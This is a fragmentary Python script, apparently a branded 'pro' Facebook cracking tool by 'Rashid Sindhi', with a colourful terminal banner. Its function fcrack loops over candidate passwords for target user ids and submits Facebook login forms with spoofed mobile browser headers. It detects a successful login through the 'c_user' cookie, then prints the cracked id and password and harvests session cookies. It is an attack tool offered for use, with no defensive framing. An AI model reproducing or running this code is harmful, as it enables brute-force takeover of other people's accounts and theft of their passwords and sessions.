...
█▓▒­░⡷⠂ЯДSHID⠐⢾░▒▓█  pro🤞                                                                                                                  
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : Rashid Sindhi
\033[97;1m>>     Facebook : Rashid Sindhi
\033[97;1m>>     Version  : 2.0.1
\033[97;1m>>     Github  : Sindhi78
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mRASHID\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			...
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'Referer': 'https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/lRGffgGxY1I.css?_nc_x=Ij3Wp8lg5Kz',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[RASHID-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[RASHID-OK] '+uid+' | '+ps+'\33[0;97m')
